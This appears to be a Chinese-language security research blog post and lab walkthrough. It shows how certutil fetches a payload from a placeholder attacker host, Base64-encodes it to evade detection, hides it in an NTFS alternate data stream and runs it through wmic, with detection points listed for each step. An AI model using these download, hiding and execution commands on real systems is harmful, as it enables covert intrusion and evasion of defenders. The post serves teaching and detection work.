---
title: "From LOL to LOLBAS - Win10/11 Attack"
published: 2025-04-30T15:41:46.000Z
description: ""
tags: [Research, Windows, LOLBAS]
category: Research
draft: false
---
### **Certutil 的障眼法 - 下載、編碼/解碼與藏身術 (ADS)**

**目標：**
演示如何利用 Windows 內建的 `certutil.exe` 工具，執行檔案下載、Base64 編碼/解碼（這個是為了規避偵測），以及將檔案隱藏到 NTFS 替代資料流 (Alternate Data Stream, ADS) 中，最後嘗試從 ADS 執行。

**所需環境：**

1. **攻擊者機器 (Attacker VM):**
   * 能運行一個簡單的 HTTP 伺服器就好。
   * 準備一個「惡意」負載檔案，為了安全演示，這邊使用的是小算盤。找到 `calc.exe` (通常在 `C:\Windows\System32\`)，複製一份並重新命名為 `payload.exe`。
   * 記下攻擊者機器的 IP 位址 (`<attacker_ip>`)。
2. **受害者機器 (Victim VM):**
   * Windows 10 或 Windows 11 虛擬機。
   * 確保網路設定允許 Victim VM 訪問 Attacker VM 的 HTTP 服務。

**攻擊者機器操作：**

1. 將準備好的 `payload.exe` 放在一個資料夾中。
2. 在該資料夾下開啟 Terminal。
3. 啟動一個簡單的 HTTP 伺服器。
   ```bash
   python -m http.server 8000
   ```

   保持此伺服器運行。

**受害者機器操作：**

* 開啟「命令提示字元」(cmd.exe)。建議切換到一個方便操作的目錄（畫面才不會亂亂的w），例如 `C:\Users\Public\Downloads`。
  ```cmd
  cd C:\Users\Public\Downloads
  ```

1. **步驟 1：使用 Certutil 下載檔案**

   * **指令：** (將 `<attacker_ip>` 替換為攻擊者機器 IP)
     ```cmd
     certutil.exe -urlcache -split -f http://<attacker_ip>:8000/payload.exe payload.exe
     ```

     * **說明：** `-urlcache -split -f` 是 `certutil` 用於從 URL 下載檔案的參數組合。
   * **預期結果：** Terminal 顯示下載成功。在 `C:\Users\Public\Downloads` 目錄下會出現 `payload.exe` 檔案。執行應該會彈出計算機。
   * **偵測點：** 監控 `certutil.exe` 的程序創建事件 (Sysmon EID 1 / Security 4688)，注意命令列包含 `-urlcache`, `-split`, `-f` 及 URL。監控 `certutil.exe` 的網路連線 (Sysmon EID 3)，注意其 User-Agent (`Microsoft-CryptoAPI/10.0` 或 `CertUtil URL Agent`)。檢查 `CryptnetUrlCache` 目錄是否有下載痕跡。
2. **步驟 2：使用 Certutil 將檔案編碼為 Base64**

   * **指令：**
     ```cmd
     certutil -encode payload.exe encoded_payload.txt
     ```

     * **說明：** `-encode` 參數用於將檔案進行 Base64 編碼。
   * **預期結果：** 在目前目錄下生成一個名為 `encoded_payload.txt` 的文字檔案，內容是 Base64 編碼的字串。
   * **偵測點：** 監控 `certutil.exe` 的程序創建事件，注意命令列包含 `-encode`。
3. **步驟 3：(可做可不做) 刪除原始檔案**

   * **指令：**
     ```cmd
     del payload.exe
     ```
   * **預期結果：** 原始的 `payload.exe` 被刪除。
4. **步驟 4：使用 Certutil 將 Base64 檔案解碼還原**

   * **指令：**
     ```cmd
     certutil -decode encoded_payload.txt decoded_payload.exe
     ```

     * **說明：** `-decode` 參數用於解碼 Base64 檔案。
   * **預期結果：** 在目前目錄下生成 `decoded_payload.exe`。執行應彈出計算機。
   * **偵測點：** 監控 `certutil.exe` 的程序創建事件，注意命令列包含 `-decode`。
5. **步驟 5：使用 Certutil 將檔案下載到 ADS**

   * **準備：** 新增一個看似無害的文字檔。
     ```cmd
     echo This is a normal text file. > benign.txt
     ```
   * **指令：** (將 `<attacker_ip>` 替換為攻擊者機器 IP)
     ```cmd
     certutil.exe -urlcache -split -f http://<attacker_ip>:8000/payload.exe benign.txt:hidden.exe
     ```

     * **說明：** 將下載目標指定為 `檔案名:流名稱`，即可寫入 ADS。
   * **預期結果：** 命令執行成功。檢查 `benign.txt` 的檔案大小，應該沒有變化。但 `payload.exe` 已被隱藏在 `benign.txt` 的 `hidden.exe` 這個 ADS 中。
   * **偵測點：** 監控 `certutil.exe` 的程序創建事件，注意命令列包含 `-urlcache` 和 `:流名稱`。監控 Sysmon Event ID 15 (FileStreamCreated) 事件，會記錄 ADS 的創建。
6. **步驟 6：從 ADS 執行 (使用 WMIC)**

   * **指令：**
     ```cmd
     wmic process call create "C:\Users\Public\Downloads\benign.txt:hidden.exe"
     ```

     * **說明：** `wmic process call create` 可以用來啟動程序，包括位於 ADS 中的程序。
   * **預期結果：** 計算機 (`calc.exe`) 彈出。
   * **偵測點：** 監控 `wmic.exe` 的程序創建事件，注意命令列包含 `:流名稱`。觀察程序樹，`wmic.exe` 啟動了 `benign.txt:hidden.exe` (實際執行的是 `calc.exe`)。

**攻擊者機器觀察：**

* 在 HTTP 伺服器的終端機視窗中，應該會看到來自 Victim VM IP 位址的 GET 請求記錄，請求的資源是 `/payload.exe`。

---

### **tmptool 漏洞與利用 - 完整偵查攻擊流程**

win10 arm64 vm:
https://massgrave.dev/windows_arm_links

**深入了解 Windows 如何整理檔案 (NTFS 基礎)**

想像一下你的電腦硬碟是一個巨大的倉庫，需要一個高效的管理系統來存放和尋找各種貨物（檔案）。NTFS (New Technology File System) 就是 Windows 使用的那個先進的管理系統，從 Windows NT/XP 時代一直沿用至今。

跟舊式的管理方法（像是 FAT/FAT32，你可以想成是簡單的標籤登記）比起來，NTFS 有幾個重要的特點：

1. **檔案不只是檔案，更像是一個「物件」：**

   * 在 NTFS 眼裡，一個檔案（例如 `mydocument.docx`）不單純只是一塊資料。它把它看作是一個**包含了很多「屬性」(Attributes) 的集合體**。
   * 這些屬性包括了我們熟悉的：檔案名稱、建立/修改時間、唯讀/隱藏設定、檔案擁有者和權限 (誰可以讀寫)。
   * **最關鍵的是：連檔案的「實際內容」（文件的文字、圖片的像素資料等）本身，也只是一種叫做 `$DATA` 的屬性！**
2. **中央總管：主檔案表 (Master File Table - MFT)：**

   * NTFS 把所有檔案和資料夾的「身分證」和「屬性清單」都記錄在一個非常重要的、隱藏的「總登記簿」裡，叫做 MFT。
   * 硬碟上的每個檔案/資料夾，在 MFT 裡都至少有一條記錄，詳細記載它的所有屬性。如果屬性不多，甚至直接存在 MFT 裡；如果屬性太多（例如檔案內容很大），MFT 裡會記錄指向硬碟其他位置的指標。

**檔案的「主要內容」 vs. 「隱藏夾層」(預設資料流 vs. ADS)**

了解了檔案是由「屬性」組成的之後，我們來聚焦在存放「內容」的 `$DATA` 屬性上：

1. **每個檔案都有「主要置物空間」(預設資料流 - Default Data Stream)：**

   * 任何一個正常的檔案，至少會有一個 `$DATA` 屬性，用來存放我們平常認知中的檔案內容。例如，你在 Word 裡打的字，就是存在這個主要的 `$DATA` 屬性裡。
   * 這個主要的 `$DATA` 流，在 NTFS 內部是**沒有名字**的（或者說名字是空的）。
   * 當你用檔案總管點兩下打開檔案，或者用 `type`、`more` 等基本指令讀取檔案時，你互動的就是這個**沒有名字的、預設的 `$DATA` 流**。
   * 它的完整寫法類似 `myfile.txt::$DATA`，但因為是預設的，通常直接簡寫成 `myfile.txt`。
2. **檔案可以有「隱藏夾層」(替代資料流 - Alternate Data Streams, ADS)：**

   * **這是 NTFS 的一個核心特性：它允許一個檔案（或甚至是一個資料夾）擁有 *不只一個* `$DATA` 資料流！**
   * 除了那個主要的、沒名字的 `$DATA` 流之外，你可以**額外附加其他的 `$DATA` 流**到同一個檔案上，但這些額外的流必須**有自己的名字**。這就是「替代資料流」(ADS)。
   * **比喻：** 再次想像那個行李箱。
     * 主要的衣物放在行李箱主空間裡（預設資料流）。
     * 你可以把一些不想讓別人看到的小東西（X，塞進行李箱內襯的**秘密拉鍊夾層**裡（替代資料流）。這個夾層屬於同一個行李箱，但跟主要空間是分開的，而且你需要知道有這個夾層（知道它的名字）才能找到裡面的東西。
   * **命名方式：** 在指令列環境下，通常用 `檔案名稱:資料流名稱` 的格式來指定 ADS。例如，`myfile.txt:hidden_info` 就表示 `myfile.txt` 這個檔案上，附加了一個叫做 `hidden_info` 的 ADS。更完整的內部表示是 `myfile.txt:hidden_info:$DATA`。流的名稱可以使用大部分合法的檔名 字元。

**ADS 的「正當」用途與「隱蔽」特性**

* **最初目的：** ADS 設計的初衷之一是為了相容蘋果電腦早期的檔案系統 (HFS)，它也有類似的「分叉」(forks) 概念，允許一個檔案包含多種資料。
* **合法應用：** Windows 自己也會用到 ADS。最常見的例子是：當你從網路上下載一個檔案時，瀏覽器通常會在這個檔案後面附加一個叫做 `Zone.Identifier` 的 ADS。這個 ADS 裡記錄了檔案的來源區域（例如來自網際網路）。當你試圖執行這個檔案時，Windows 會檢查這個 ADS，如果發現是來自不信任區域，就會跳出安全警告。
* **關鍵的隱蔽性：**
  * **看不見：** 對於一般的 Windows 工具（檔案總管、大部分應用程式、基本的 `dir` 指令）來說，ADS 是**完全透明**的。你看不到它們的存在。
  * **大小不變：** 一個檔案就算附加了很大的 ADS（例如藏了一個 10MB 的程式在一個 1KB 的文字檔的 ADS 裡），你在檔案總管看到的檔案大小，仍然只會顯示主要的、預設資料流的大小（1KB）。這使得藏在 ADS 裡的東西非常難以被察覺。

**Why ADS？**

正是因為 ADS 的這種「**原生隱蔽性**」和「**大小欺騙性**」，讓它成為攻擊者完美的藏匿地點：

1. **藏匿惡意軟體：** 把病毒執行檔 (.exe)、惡意動態連結庫 (.dll)、腳本 (.ps1, .vbs) 等，附加到一個看似無害的正常檔案（如系統日誌 .log、設定檔 .ini、普通文字檔 .txt）的 ADS 中。
2. **藏匿駭客工具：** 攻擊過程中需要用到的其他工具，也可以藏在 ADS 裡，避免直接放在硬碟上被掃描發現。
3. **藏匿竊取資料：** 偷到的敏感資料，可以先暫時寫入某個檔案的 ADS，再找機會傳出去。
4. **躲避偵測：** 很多傳統的防毒軟體、檔案掃描工具，預設可能不會去檢查檔案的 ADS 部分。即使掃描了主檔案是乾淨的，也可能忽略藏在 ADS 裡的威脅。

總之，NTFS 的 ADS 提供了一個由檔案系統本身支援的、對常規用戶和工具「隱形」的儲存空間。攻擊者利用這個特性，就能在不引起注意的情況下，將惡意物件隱藏在系統的眼皮底下，大大增加了防禦的難度。

![image](https://hackmd.io/_uploads/Bkmvqwkexe.png)

![image](https://hackmd.io/_uploads/B1M65vklxl.png)

![image](https://hackmd.io/_uploads/S1Ewsv1glx.png)
